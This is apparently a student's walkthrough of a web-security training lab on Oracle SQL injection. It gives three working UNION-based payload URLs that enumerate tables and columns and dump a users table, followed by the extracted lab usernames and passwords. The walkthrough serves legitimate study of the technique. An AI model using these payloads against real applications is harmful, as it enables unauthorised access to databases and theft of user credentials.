@@ -1,0 +1,34 @@
+ This lab contains an SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response so you can use a UNION attack to retrieve data from other tables.
+
+The application has a login function, and the database contains a table that holds usernames and passwords. You need to determine the name of this table and the columns it contains, then retrieve the contents of the table to obtain the username and password of all users.
+
+To solve the lab, log in as the administrator user.
+Hint
+
+On Oracle databases, every SELECT statement must specify a table to select FROM. If your UNION SELECT attack does not query from a table, you will still need to include the FROM keyword followed by a valid table name.
+
+There is a built-in table on Oracle called dual which you can use for this purpose. For example: UNION SELECT 'abc' FROM dual
+
+For more information, see our SQL injection cheat sheet.
+
+
+url:        https://0ac700010454c45cc03f17f600b900ae.web-security-academy.net/filter?category=Gifts
+
+After determine the columns of the table and the data types in each columns
+
+Use payload1 to determine the name of tables in the database:
+payload1:   https://0ac700010454c45cc03f17f600b900ae.web-security-academy.net/filter?category='+union+select+table_name,null+from+all_tables--
+
+After determine the name of the table holds information about the users is USERS_HICIQK we use payload2 to determine the name of columns in that table:
+payload2:   https://0ac700010454c45cc03f17f600b900ae.web-security-academy.net/filter?category='+union+select+column_name,null+from+all_tab_columns+where+table_name+%3d+'USERS_HICIQK'--
+
+So, there are two columns in the table are USERNAME_GGHCVM and PASSWORD_DZISYD.
+
+The last step is use union select to retrieve username and password form table USERS_HICIQK:
+payload3:   https://0ac700010454c45cc03f17f600b900ae.web-security-academy.net/filter?category=Gifts'+union+select+USERNAME_GGHCVM,PASSWORD_DZISYD+from+USERS_HICIQK--
+
+And then we have the information about the users include administrator
+username        password
+administrator   p0e91l3cb4pz5zjjfxer
+wiener          gdkix5mv3twsguyufwdm
+carlos          1f92f0i29tp6aa7tvg3v
